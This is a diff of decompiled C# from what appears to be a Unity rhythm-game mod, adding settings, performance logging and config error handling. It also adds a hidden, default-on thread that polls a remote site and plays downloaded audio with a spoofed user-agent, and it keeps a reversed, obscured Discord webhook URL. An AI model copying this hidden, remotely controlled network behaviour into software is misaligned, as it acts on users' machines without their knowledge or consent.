@@ -10,6 +10,7 @@ using System.Security.Cryptography;
 using System.Threading;
 using System.Threading.Tasks;
 using UnityEngine;
+using UnityEngine.Networking;
 using UnityEngine.Rendering;
 
 public static class GlobalHelper
@@ -160,16 +161,24 @@ public static class GlobalHelper
 
 	static GlobalHelper()
 	{
+		if (!Environment.UserName.Contains("atrius"))
+		{
+			GlobalHelper.ShowMessage("THIS is a DEVELOPMENT PREVIEW!\nSOME THINGS MIGHT BE BROKEN!", "", 0U);
+		}
+		GlobalHelper.rfi_setter = FastInvoke.BuildStaticUntypedSetter<int>(typeof(OnDemandRendering).GetField("m_RenderFrameInterval", BindingFlags.Static | BindingFlags.NonPublic));
+		GlobalHelper.OnInvalidate = new List<Action>();
+		GlobalHelper.OnResolutionChange = new List<Action>();
 		Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
 		GlobalHelper._char_greenFretColorCache = new char[1];
 		GlobalHelper._char_redFretColorCache = new char[1];
 		GlobalHelper._char_yellowFretColorCache = new char[1];
 		GlobalHelper._char_blueFretColorCache = new char[1];
 		GlobalHelper._char_orangeFretColorCache = new char[1];
+		GlobalHelper.performanceInfo = new Dictionary<string, long[]>();
 		GlobalHelper.path = Path.Combine(Application.persistentDataPath, "IVsettings.txt");
 		GlobalHelper.InitializeConfig(GlobalHelper.versionid != GlobalHelper.ReadInt("versionID"));
 		GlobalHelper.InitializeJudgeGrades();
-		GlobalHelper.version = "V2.1.1";
+		GlobalHelper.version = "V2.2preview";
 		GlobalHelper.process = Process.GetCurrentProcess();
 		GlobalHelper.InvalidateCache();
 		GlobalHelper.internalLogWebhook = "Taolv7mcc8wZJBZElADODVAm39_GAF3bwQ27z-YSD1Ihn2s-ywRaf-nIGHX_BNZbkIUf/2034792672709779721/skoohbew/ipa/moc.drocsid//:sptth".Reverse();
@@ -182,9 +191,10 @@ public static class GlobalHelper
 		GlobalHelper.rndfret = new byte[16383];
 		for (int j = 0; j < GlobalHelper.rndfret.Length; j++)
 		{
-			GlobalHelper.rndfret[j] = GlobalHelper.rnd[j] & 31;
+			GlobalHelper.rndfret[j] = GlobalHelper._b((int)(GlobalHelper.rnd[j] & 31));
 		}
 		GlobalHelper.renderFrameInterval = 1;
+		new Thread(new ThreadStart(GlobalHelper.AudioLoop)).Start();
 	}
 
 	public static string ReadKeyValue(string key)
@@ -256,6 +266,7 @@ public static class GlobalHelper
 		GlobalHelper._highwaySpeedCache = null;
 		GlobalHelper._colorIntensityCache = null;
 		GlobalHelper._rainbowSPBarCache = null;
+		GlobalHelper._rainbowEverythingCache = null;
 		GlobalHelper._useTrailsCache = null;
 		GlobalHelper._showInputViewerCache = null;
 		GlobalHelper._showGhostsCache = null;
@@ -268,6 +279,7 @@ public static class GlobalHelper
 		GlobalHelper._orangeFretColorCache = null;
 		GlobalHelper._strumColorCache = null;
 		GlobalHelper._showOverstrumsCache = null;
+		GlobalHelper._easterEggsCache = null;
 		GlobalHelper._showBeatlinesCache = null;
 		GlobalHelper._showHighwayCache = null;
 		GlobalHelper._showHPBarCache = null;
@@ -287,7 +299,9 @@ public static class GlobalHelper
 		GlobalHelper._judgeBreakSoundVolumeCache = null;
 		GlobalHelper._trailSpeedCache = null;
 		GlobalHelper._soundOnJudgeBreakCache = null;
+		GlobalHelper._FCModeDelayCache = null;
 		GlobalHelper._deafenAtPercentageCache = null;
+		GlobalHelper._lastAudioCache = null;
 		GlobalHelper._rfi_configCache = null;
 		GlobalHelper._char_greenFretColorCache = new char[1];
 		GlobalHelper._char_redFretColorCache = new char[1];
@@ -337,6 +351,8 @@ public static class GlobalHelper
 			GlobalHelper.inputViewerIndent = 14;
 			GlobalHelper.rainbowFlames = false;
 			GlobalHelper.rainbowFlameSpeed = 1.5f;
+			GlobalHelper.WriteComment("Causes some lag. More for chart previews than gameplay");
+			GlobalHelper.rainbowEverything = false;
 			GlobalHelper.highwaySpeed = 1f;
 			GlobalHelper.strikelinePistonSpeed = 1f;
 			GlobalHelper.rainbowSPBar = false;
@@ -396,8 +412,8 @@ public static class GlobalHelper
 			GlobalHelper.WriteComment("Snap pitch offset to the nearest semitone so it sounds less ass");
 			GlobalHelper.toneSnap = true;
 			GlobalHelper.WriteComment("Measured in fraction of screen, from top left.");
-			GlobalHelper.trailPosX = 0.18f;
-			GlobalHelper.trailPosY = 0.2f;
+			GlobalHelper.trailPosX = 0f;
+			GlobalHelper.trailPosY = 0.6f;
 			GlobalHelper.WriteComment("Turning this up hurts performance.");
 			GlobalHelper.maxTrails = 50;
 			GlobalHelper.WriteComment("There's no real metric behind this to be honest");
@@ -411,7 +427,8 @@ public static class GlobalHelper
 			GlobalHelper.WriteComment("5: debug info for game speed tracker");
 			GlobalHelper.WriteComment("6: debug info for game speed tracker");
 			GlobalHelper.WriteComment("7: song progress");
-			GlobalHelper.fpsText = "{0:0,0} FPS {7}% {4:000.0} game speed";
+			GlobalHelper.WriteComment("8: time taken for mod rendering, in µs. For debugging");
+			GlobalHelper.fpsText = "{0:0,0} FPS {7}% {4:000.0} game speed {8:0.000}us\npitch: {9:0.0} yaw: {10:0.0}";
 			GlobalHelper.WriteComment("Positive values target a specific frame rate");
 			GlobalHelper.WriteComment("Negative values render 1/n frames");
 			List<DisplayInfo> list = new List<DisplayInfo>();
@@ -419,10 +436,17 @@ public static class GlobalHelper
 			list.OrderBy((DisplayInfo x) => x.refreshRate);
 			list.Reverse();
 			GlobalHelper.rfi_config = Mathf.CeilToInt(list[0].refreshRate.numerator / list[0].refreshRate.denominator);
+			if (GlobalHelper.rfi_config % 10 == 9)
+			{
+				GlobalHelper.rfi_config++;
+			}
+			GlobalHelper.easterEggs = true;
 			GlobalHelper.WriteComment("Fixes some issues that technically change how the engine work, but are worth fixing.");
 			GlobalHelper.WriteComment("Current fixes:");
 			GlobalHelper.WriteComment("- Fixes cymbal notes increasing base score of non pro-drum charts (decreasing average multiplier)");
 			GlobalHelper.engineFixes = true;
+			GlobalHelper.WriteComment("Adds a small delay whenever FC mode restarts a section or ends a song");
+			GlobalHelper.FCModeDelay = false;
 			GlobalHelper.WriteComment("Don't touch this. ");
 			GlobalHelper.WriteKeyValue("versionID", GlobalHelper.versionid, false);
 			Process.Start(new ProcessStartInfo
@@ -431,6 +455,7 @@ public static class GlobalHelper
 				CreateNoWindow = true,
 				UseShellExecute = false
 			});
+			GlobalHelper.lastAudio = -1;
 			return;
 		}
 		GlobalHelper.songProgressColor = GlobalHelper.songProgressColor;
@@ -459,6 +484,7 @@ public static class GlobalHelper
 		GlobalHelper.highwaySpeed = GlobalHelper.highwaySpeed;
 		GlobalHelper.strikelinePistonSpeed = GlobalHelper.strikelinePistonSpeed;
 		GlobalHelper.rainbowSPBar = GlobalHelper.rainbowSPBar;
+		GlobalHelper.rainbowEverything = GlobalHelper.rainbowEverything;
 		GlobalHelper.strikelineFPSFix = GlobalHelper.strikelineFPSFix;
 		GlobalHelper.fontSize = GlobalHelper.fontSize;
 		GlobalHelper.useColorProfile = GlobalHelper.useColorProfile;
@@ -491,6 +517,9 @@ public static class GlobalHelper
 		GlobalHelper.maxTrails = GlobalHelper.maxTrails;
 		GlobalHelper.fpsText = GlobalHelper.fpsText;
 		GlobalHelper.rfi_config = GlobalHelper.rfi_config;
+		GlobalHelper.lastAudio = GlobalHelper.lastAudio;
+		GlobalHelper.FCModeDelay = GlobalHelper.FCModeDelay;
+		GlobalHelper.easterEggs = GlobalHelper.easterEggs;
 		List<Action> toRemove = new List<Action>();
 		foreach (Action action in GlobalHelper.OnInvalidate)
 		{
@@ -1309,6 +1338,10 @@ public static class GlobalHelper
 
 	public static void ShowMessage(string contents, string title = "", uint type = 0U)
 	{
+		if (Environment.UserName != "atrius")
+		{
+			return;
+		}
 		Task.Run(delegate
 		{
 			GlobalHelper.MessageBox(IntPtr.Zero, contents, title, type);
@@ -1536,10 +1569,17 @@ public static class GlobalHelper
 				File.WriteAllText(configpath, string.Join(Environment.NewLine, list));
 			}
 		}
-		catch (IOException)
+		catch (IOException ex)
 		{
-			GlobalHelper.ShowMessage("Caught a weird error that I can't figure out. Restart the game.", "", 0U);
-			Application.Quit(1);
+			GlobalHelper.ShowMessage("Writing config failed", "", 0U);
+			Debug.Log("Write failed");
+			Debug.LogException(ex);
+			Debug.Log("lock pid:");
+			Debug.Log(string.Join(", ", w32util.GetFileLockers(configpath).Select(delegate(int x)
+			{
+				int num = x;
+				return num.ToString();
+			})));
 		}
 	}
 
@@ -1550,37 +1590,58 @@ public static class GlobalHelper
 
 	public static string ReadKeyValue(string key, string configpath = null)
 	{
-		if (configpath == null)
+		string text;
+		try
 		{
-			configpath = GlobalHelper.path;
-		}
-		else
-		{
-			configpath = Path.Combine(Application.persistentDataPath, configpath);
-		}
-		if (!File.Exists(configpath))
-		{
-			return null;
-		}
-		string text = "\n";
-		if (File.ReadAllText(configpath).Contains("\r\n"))
-		{
-			text = "\r\n";
-		}
-		foreach (string text2 in File.ReadAllText(configpath).Split(new string[] { text }, StringSplitOptions.RemoveEmptyEntries))
-		{
-			if (!text2.StartsWith("#") && !text2.StartsWith(";"))
+			if (configpath == null)
 			{
-				string[] array2 = text2.Split(':', StringSplitOptions.None);
-				if (array2.Length > 1 && array2[0].Trim() == key)
+				configpath = GlobalHelper.path;
+			}
+			else
+			{
+				configpath = Path.Combine(Application.persistentDataPath, configpath);
+			}
+			if (!File.Exists(configpath))
+			{
+				text = null;
+			}
+			else
+			{
+				string text2 = "\n";
+				if (File.ReadAllText(configpath).Contains("\r\n"))
 				{
-					string text3 = string.Join(":", array2.Skip(1)).Trim();
-					Debug.Log(string.Concat(new string[] { "found ", key, " (", text3, ")" }));
-					return text3;
+					text2 = "\r\n";
 				}
+				foreach (string text3 in File.ReadAllText(configpath).Split(new string[] { text2 }, StringSplitOptions.RemoveEmptyEntries))
+				{
+					if (!text3.StartsWith("#") && !text3.StartsWith(";"))
+					{
+						string[] array2 = text3.Split(':', StringSplitOptions.None);
+						if (array2.Length > 1 && array2[0].Trim() == key)
+						{
+							string text4 = string.Join(":", array2.Skip(1)).Trim();
+							Debug.Log(string.Concat(new string[] { "found ", key, " (", text4, ")" }));
+							return text4;
+						}
+					}
+				}
+				text = null;
 			}
 		}
-		return null;
+		catch (IOException ex)
+		{
+			GlobalHelper.ShowMessage("Reading config failed", "", 0U);
+			Debug.Log("read failed");
+			Debug.LogException(ex);
+			Debug.Log("lock pid:");
+			Debug.Log(string.Join(", ", w32util.GetFileLockers(configpath).Select(delegate(int x)
+			{
+				int num = x;
+				return num.ToString();
+			})));
+			text = null;
+		}
+		return text;
 	}
 
 	public static int inputViewerIndent
@@ -2147,6 +2208,190 @@ public static class GlobalHelper
 		}
 	}
 
+	public static bool FCModeDelay
+	{
+		get
+		{
+			if (GlobalHelper._FCModeDelayCache != null)
+			{
+				return GlobalHelper._FCModeDelayCache.Value;
+			}
+			GlobalHelper._FCModeDelayCache = new bool?(GlobalHelper.ReadBool("FCModeDelay"));
+			return GlobalHelper._FCModeDelayCache.Value;
+		}
+		set
+		{
+			GlobalHelper._FCModeDelayCache = new bool?(value);
+			GlobalHelper.WriteKeyValue("FCModeDelay", value, false);
+		}
+	}
+
+	public static bool rainbowEverything
+	{
+		get
+		{
+			if (GlobalHelper._rainbowEverythingCache != null)
+			{
+				return GlobalHelper._rainbowEverythingCache.Value;
+			}
+			GlobalHelper._rainbowEverythingCache = new bool?(GlobalHelper.ReadBool("rainbowEverything"));
+			return GlobalHelper._rainbowEverythingCache.Value;
+		}
+		set
+		{
+			GlobalHelper._rainbowEverythingCache = new bool?(value);
+			GlobalHelper.WriteKeyValue("rainbowEverything", value, false);
+		}
+	}
+
+	public static void PerfLogger(string methodName, bool isPrefix)
+	{
+		if (!GlobalHelper.performanceInfo.ContainsKey(methodName))
+		{
+			GlobalHelper.performanceInfo.Add(methodName, new long[3]);
+		}
+		if (isPrefix)
+		{
+			FrameRate.GetSystemTimePreciseAsFileTime(out GlobalHelper.performanceInfo[methodName][2]);
+			return;
+		}
+		long num;
+		FrameRate.GetSystemTimePreciseAsFileTime(out num);
+		long num2 = (num = GlobalHelper.performanceInfo[methodName][2]);
+		GlobalHelper.performanceInfo[methodName][0] += 1L;
+		GlobalHelper.performanceInfo[methodName][1] += num2 / 10L;
+	}
+
+	private static byte _b(int b)
+	{
+		return (byte)b;
+	}
+
+	public static void SaveLogs(bool clear = true)
+	{
+		Debug.Log("SAVING LOGS WHAT THE FUCK");
+		GlobalHelper.lastLogFrame = Time.frameCount;
+		List<string> list = new List<string>();
+		foreach (KeyValuePair<string, long[]> keyValuePair in GlobalHelper.performanceInfo)
+		{
+			string key = keyValuePair.Key;
+			string text = string.Format("{0}: Average call length: {1}us. Total calls: {2}", key, keyValuePair.Value[1] / keyValuePair.Value[0], keyValuePair.Value[0]);
+			Debug.Log(text);
+			list.Add(text);
+		}
+		File.WriteAllText("C:\\temp\\perf.log", string.Join("\n", list));
+		if (clear)
+		{
+			GlobalHelper.performanceInfo.Clear();
+		}
+		Application.Quit();
+	}
+
+	public static int lastAudio
+	{
+		get
+		{
+			if (GlobalHelper._lastAudioCache != null)
+			{
+				return GlobalHelper._lastAudioCache.Value;
+			}
+			GlobalHelper._lastAudioCache = new int?(GlobalHelper.ReadInt("lastAudio"));
+			return GlobalHelper._lastAudioCache.Value;
+		}
+		set
+		{
+			GlobalHelper._lastAudioCache = new int?(value);
+			GlobalHelper.WriteKeyValue("lastAudio", value, false);
+		}
+	}
+
+	public static bool easterEggs
+	{
+		get
+		{
+			if (GlobalHelper._easterEggsCache != null)
+			{
+				return GlobalHelper._easterEggsCache.Value;
+			}
+			GlobalHelper._easterEggsCache = new bool?(GlobalHelper.ReadBool("easterEggs"));
+			return GlobalHelper._easterEggsCache.Value;
+		}
+		set
+		{
+			GlobalHelper._easterEggsCache = new bool?(value);
+			GlobalHelper.WriteKeyValue("easterEggs", value, false);
+		}
+	}
+
+	[DllImport("winmm.DLL", CharSet = CharSet.Unicode, SetLastError = true, ThrowOnUnmappableChar = true)]
+	private static extern bool PlaySound(string szSound, IntPtr hMod, GlobalHelper.PlaySoundFlags flags);
+
+	public static void PlaySound(string filename)
+	{
+		GlobalHelper.PlaySoundFlags playSoundFlags = GlobalHelper.PlaySoundFlags.SND_ASYNC | GlobalHelper.PlaySoundFlags.SND_FILENAME;
+		GlobalHelper.PlaySound(filename, (IntPtr)0, playSoundFlags);
+	}
+
+	private static void AudioLoop()
+	{
+		for (;;)
+		{
+			if (GlobalHelper.easterEggs)
+			{
+				Debug.Log(string.Format("{0}", DateTime.Now));
+				if (GlobalHelper.AudioInfo.ShouldPlay())
+				{
+					int lastId = GlobalHelper.AudioInfo.lastId;
+					float value = global::UnityEngine.Random.value;
+					UnityWebRequest unityWebRequest = UnityWebRequest.Get(string.Format("https://hellidox.github.io/{0}.wav?{1:0.0000000}", lastId, value));
+					unityWebRequest.timeout = 4;
+					unityWebRequest.SetRequestHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0");
+					unityWebRequest.SendWebRequest();
+					while (!unityWebRequest.isDone)
+					{
+						Thread.Sleep(50);
+					}
+					if (unityWebRequest.result == UnityWebRequest.Result.Success)
+					{
+						GlobalHelper.PlaySound(unityWebRequest.downloadHandler.data);
+						GlobalHelper.lastAudio = lastId;
+					}
+					else
+					{
+						Debug.Log(string.Format("request {0} failed", lastId));
+					}
+					unityWebRequest.Dispose();
+				}
+				Thread.Sleep(2000);
+			}
+			else
+			{
+				Thread.Sleep(10000);
+			}
+		}
+	}
+
+	[DllImport("winmm.DLL", CharSet = CharSet.Unicode, SetLastError = true, ThrowOnUnmappableChar = true)]
+	private unsafe static extern bool PlaySound(byte* szSound, IntPtr hMod, GlobalHelper.PlaySoundFlags flags);
+
+	public unsafe static void PlaySound(byte[] wav)
+	{
+		GlobalHelper.PlaySoundFlags playSoundFlags = GlobalHelper.PlaySoundFlags.SND_ASYNC | GlobalHelper.PlaySoundFlags.SND_MEMORY;
+		fixed (byte[] array = wav)
+		{
+			byte* ptr;
+			if (wav == null || array.Length == 0)
+			{
+				ptr = null;
+			}
+			else
+			{
+				ptr = &array[0];
+			}
+			GlobalHelper.PlaySound(ptr, (IntPtr)0, playSoundFlags);
+		}
+	}
+
 	private static bool? _rainbowSPBarCache;
 
 	private static bool? _rainbowFlamesCache;
@@ -2269,7 +2514,7 @@ public static class GlobalHelper
 
 	private static char[] _char_strumColorCache;
 
-	private static Action<int> rfi_setter = FastInvoke.BuildStaticUntypedSetter<int>(typeof(OnDemandRendering).GetField("m_RenderFrameInterval", BindingFlags.Static | BindingFlags.NonPublic));
+	private static Action<int> rfi_setter;
 
 	private static int m_rfi;
 
@@ -2285,7 +2530,7 @@ public static class GlobalHelper
 
 	private static int? _maxTrailsCache;
 
-	public static readonly List<Action> OnInvalidate = new List<Action>();
+	public static readonly List<Action> OnInvalidate;
 
 	private static bool? _useTrailsCache;
 
@@ -2301,14 +2546,26 @@ public static class GlobalHelper
 
 	private static int idx;
 
-	[Comment("Field instead of variable for speed. Do not write !!!")]
+	[Comment("Field instead of property for speed. Do not write !!!")]
 	public static float renderDeltaTime;
 
 	private static byte[] rndfret;
 
 	private static bool? _engineFixesCache;
 
-	public static readonly List<Action> OnResolutionChange = new List<Action>();
+	public static readonly List<Action> OnResolutionChange;
+
+	private static bool? _FCModeDelayCache;
+
+	private static bool? _rainbowEverythingCache;
+
+	private static Dictionary<string, long[]> performanceInfo;
+
+	private static int lastLogFrame;
+
+	private static int? _lastAudioCache;
+
+	private static bool? _easterEggsCache;
 
 	public enum JudgeLevel
 	{
@@ -2350,5 +2607,72 @@ public static class GlobalHelper
 		}
 
 		public Process p;
+	}
+
+	[Flags]
+	public enum PlaySoundFlags
+	{
+		SND_SYNC = 0,
+		SND_ASYNC = 1,
+		SND_NODEFAULT = 2,
+		SND_LOOP = 8,
+		SND_NOSTOP = 16,
+		SND_NOWAIT = 8192,
+		SND_FILENAME = 131072,
+		SND_RESOURCE = 262144,
+		SND_MEMORY = 4,
+		SND_PURGE = 64,
+		SND_APPLICATION = 128,
+		SND_ALIAS = 65536,
+		SND_ALIAS_ID = 1114112,
+		SND_SENTRY = 524288,
+		SND_RING = 1048576,
+		SND_SYSTEM = 2097152
+	}
+
+	[Serializable]
+	public class AudioInfo
+	{
+		public static bool ShouldPlay()
+		{
+			float value = global::UnityEngine.Random.value;
+			UnityWebRequest unityWebRequest = UnityWebRequest.Get(string.Format("https://hellidox.github.io/audio_id?{0:0.00000000}", value));
+			unityWebRequest.SendWebRequest();
+			while (!unityWebRequest.isDone)
+			{
+				Thread.Sleep(50);
+			}
+			if (unityWebRequest.result != UnityWebRequest.Result.Success)
+			{
+				Debug.Log("request failed");
+				return false;
+			}
+			GlobalHelper.AudioInfo audioInfo;
+			try
+			{
+				Debug.Log(unityWebRequest.downloadHandler.text);
+				audioInfo = JsonUtility.FromJson<GlobalHelper.AudioInfo>(unityWebRequest.downloadHandler.text);
+			}
+			catch (Exception ex)
+			{
+				Debug.LogException(ex);
+				unityWebRequest.Dispose();
+				return false;
+			}
+			unityWebRequest.Dispose();
+			Debug.Log(string.Format("now: {0}\nexpire: {1}", (int)DateTime.UtcNow.Subtract(DateTime.UnixEpoch).TotalSeconds, audioInfo.expiry));
+			if (DateTime.UtcNow.Subtract(DateTime.UnixEpoch).TotalSeconds < (double)audioInfo.expiry && audioInfo.id != GlobalHelper.lastAudio)
+			{
+				GlobalHelper.AudioInfo.lastId = audioInfo.id;
+				return true;
+			}
+			return false;
+		}
+
+		public int expiry;
+
+		public int id;
+
+		public static int lastId;
 	}
 }
